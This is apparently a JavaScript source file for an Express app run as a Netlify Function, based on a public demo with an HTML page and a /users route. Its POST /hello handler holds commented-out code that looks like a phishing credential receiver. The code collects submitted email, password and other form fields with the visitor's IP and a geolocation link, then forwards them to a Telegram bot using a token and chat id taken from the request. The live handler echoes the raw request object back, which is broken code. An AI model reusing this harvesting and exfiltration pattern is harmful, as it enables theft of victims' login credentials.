/* Express App */
import express from 'express'
import cors from 'cors'
import morgan from 'morgan'
import bodyParser from 'body-parser'
import compression from 'compression'
import customLogger from '../utils/logger'
import telegrambot from 'node-telegram-bot-api'

/* My express App */
export default function expressApp(functionName) {
  const app = express()
  const router = express.Router()

  // gzip responses
  router.use(compression())

  // Set router base path for local dev
  const routerBasePath = process.env.NODE_ENV === 'dev' ? `/${functionName}` : `/.netlify/functions/${functionName}/`

  /* define routes */
  router.get('/', (req, res) => {
    const html = `
    <html>
      <head>
        <style>
          body {
            padding: 30px;
          }
        </style>
      </head>
      <body>
        <h1>Express via '${functionName}' ⊂◉‿◉つ</h1>

        <p>I'm using Express running via a <a href='https://www.netlify.com/docs/functions/' target='_blank'>Netlify Function</a>.</p>

        <p>Choose a route:</p>

        <div>
          <a href='/.netlify/functions/${functionName}/users'>View /users route</a>
        </div>

        <div>
          <a href='/.netlify/functions/${functionName}/hello'>View /hello route</a>
        </div>

        <br/>
        <br/>

        <div>
          <a href='/'>
            Go back to demo homepage
          </a>
        </div>

        <br/>
        <br/>

        <div>
          <a href='https://github.com/DavidWells/netlify-functions-express' target='_blank'>
            See the source code on github
          </a>
        </div>
      </body>
    </html>
  `
    res.send(html)
  })

  router.get('/users', (req, res) => {
    res.json({
      users: [
        {
          name: 'steve',
        },
        {
          name: 'joe',
        },
      ],
    })
  })

  router.post('/hello/', function(req, res) {
//     app.get('/', function(req, res){
//    res.header("Access-Control-Allow-Origin", "*");
//    res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
//    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
//    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  
//    // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
//        let msg='';
//   for (let [key, value] of Object.entries(req.body.val)) {
//   msg +=key+' : '+ value+'\n';
 
// }
// msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
     
//    console.log(msg);


// // Create a bot that uses 'polling' to fetch new updates
// //const bot = new TelegramBot(req.body.tok, {polling: true});

// //bot.sendMessage(req.body.telid, msg);
//    res.send("recieved your request!");
// });
    res.send(req);
  })

  // Attach logger
  app.use(morgan(customLogger))

  // Setup routes
  app.use(routerBasePath, router)

  // Apply express middlewares
  router.use(cors())
  router.use(bodyParser.json())
  router.use(bodyParser.urlencoded({ extended: true }))

  return app
}
